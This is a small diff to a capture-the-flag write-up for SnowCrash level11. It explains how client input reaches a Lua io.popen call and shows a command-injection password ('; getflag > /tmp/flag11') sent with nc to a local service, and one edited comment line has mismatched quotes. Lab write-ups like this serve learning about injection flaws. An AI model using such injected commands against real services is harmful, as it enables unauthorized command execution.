@@ -19,8 +19,8 @@ level11@SnowCrash:~$ nc -zv localhost 5151
 Connection to localhost 5151 port [tcp/pcrd] succeeded!
 # hash() function receives input that is received from client.
 # Then it call popen (process open) inserting user input as echo's argument.
-#   "echo "..pass.." | sha1sum"
-#   "echo ; getflag > /tmp/flag11; | sha1sum"
+#   prog = io.popen(echo "..pass.." | sha1sum", "r")
+#   prog = io.popen("echo ; getflag > /tmp/flag11; | sha1sum", "r")
 level11@SnowCrash:~$ nc 127.0.0.1 5151
 Password: ; getflag > /tmp/flag11
 Erf nope..
